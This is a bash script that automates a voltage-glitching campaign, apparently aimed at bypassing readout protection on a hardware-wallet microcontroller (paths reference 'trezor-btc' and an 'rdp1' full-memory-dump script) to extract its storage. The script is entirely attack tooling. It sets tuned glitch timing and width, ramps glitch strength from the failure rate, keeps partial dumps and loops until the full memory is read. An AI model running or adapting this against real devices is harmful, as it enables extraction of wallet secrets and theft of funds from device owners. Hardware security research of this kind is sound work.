#!/bin/bash
# Full-window scope-OFF grind with ADAPTIVE strength. Window us 172-190
# (command-end -> NACK decision window), G_US_STEP=0.1, G_SAMPLES=10
# (~1800 shots/pass). SCOPE MUST BE OFF the VCAP glitch node.
#
# Strength: starts at rep6-7 and RAMPS +1 rep each pass, but HOLDS the band
# whenever the just-finished pass's dead rate >= DEAD_MAX% (keeps dead minimal).
# rep band -> ns mapping is epsilon-safe: G_RND_LO=rep*6-3, G_RND_HI=rep*6+3.
#
# STOP: targeted FULL DUMP (all 66 -> storage_dump.bin) or PASS_CAP passes.
# Partial real chunk is reported but does NOT stop (goal is the full dump).
set -u
cd /home/tdaly/trezor-btc/storage-sim
LOG=/tmp/opencode/fullwin_loop.log
PASS_CAP=${PASS_CAP:-10}
DEAD_MAX=${DEAD_MAX:-10}            # % dead ceiling - hold strength above this
REP_LO=${REP_LO:-6}; REP_HI=${REP_HI:-7}   # starting rep band
PASS=0
while [ $PASS -lt $PASS_CAP ]; do
  PASS=$((PASS+1))
  GLO=$((REP_LO*6-3)); GHI=$((REP_HI*6+3))
  echo "=== PASS $PASS/$PASS_CAP  rep${REP_LO}-${REP_HI} ($((REP_LO*6))-$((REP_HI*6))ns)  $(date '+%m-%d %H:%M:%S') ===" | tee -a "$LOG"
  T0=$(date +%s)
  G_CLKGEN=166666667 G_OFFSET=-45 G_WIDTH=5 \
  G_US_MIN=172 G_US_MAX=190 G_US_STEP=0.1 G_RND_REP=1 G_RND_LO=$GLO G_RND_HI=$GHI \
  G_SAMPLES=10 G_COOLDOWN=0.15 G_RESET_EVERY=1 \
  G_SHOTS=50000 G_TAG=fullwinp${PASS}_r${REP_LO}-${REP_HI} \
  /home/tdaly/.cwvenv/bin/python -u rdp1_glitch_campaign_full_mem_dump.py 2>&1 | tee -a "$LOG"
  DT=$(( $(date +%s) - T0 ))
  if ls dumps/run_*/storage_dump.bin >/dev/null 2>&1; then
    echo "=== *** FULL DUMP COMPLETE on pass $PASS -> $(ls dumps/run_*/storage_dump.bin)  STOPPING ***" | tee -a "$LOG"
    break
  fi
  REAL=$(ls dumps/run_*/*.bin 2>/dev/null | grep -v '\.bad\.bin$' | tr '\n' ' ')
  [ -n "$REAL" ] && echo "=== !!! REAL CHUNK banked (partial): $REAL - continuing toward FULL DUMP !!!" | tee -a "$LOG"
  CSV=$(ls -t campaigns/glitch2_*fullwinp${PASS}_*.csv 2>/dev/null | head -1)
  DEADPCT=$(awk -F, 'NR>2{n++; if($(NF-1)=="dead")d++} END{if(n>0) printf "%d",100*d/n; else print 99}' "$CSV" 2>/dev/null)
  DEADPCT=${DEADPCT:-99}
  GH=$(ls dumps/run_*/*.bad.bin 2>/dev/null | wc -l)
  if [ "${LOCKED:-0}" -eq 1 ]; then
    echo "=== pass $PASS done (${DT}s) dead=${DEADPCT}% -> LOCKED at rep${REP_LO}-${REP_HI} (minimal-dead sweet spot). ghosts:$GH real:${REAL:-none} ===" | tee -a "$LOG"
  elif [ "$DEADPCT" -lt "$DEAD_MAX" ]; then
    echo "=== pass $PASS done (${DT}s) dead=${DEADPCT}% (<${DEAD_MAX}%) -> RAMP to rep$((REP_LO+1))-$((REP_HI+1)). ghosts:$GH real:${REAL:-none} ===" | tee -a "$LOG"
    REP_LO=$((REP_LO+1)); REP_HI=$((REP_HI+1))
  else
    # over the dead limit: step back to the last good strength and lock there
    if [ $REP_LO -gt 6 ]; then REP_LO=$((REP_LO-1)); REP_HI=$((REP_HI-1)); fi
    LOCKED=1
    echo "=== pass $PASS done (${DT}s) dead=${DEADPCT}% (>=${DEAD_MAX}%) -> STEP BACK + LOCK at rep${REP_LO}-${REP_HI}. ghosts:$GH real:${REAL:-none} ===" | tee -a "$LOG"
  fi
  if [ $DT -lt 60 ]; then
    echo "=== pass $PASS died in ${DT}s - RIG MAY BE DOWN, backing off 120s ===" | tee -a "$LOG"; sleep 120
  else
    sleep 3
  fi
done
echo "=== GRIND ENDED after pass $PASS (cap $PASS_CAP) $(date '+%m-%d %H:%M:%S') ===" | tee -a "$LOG"
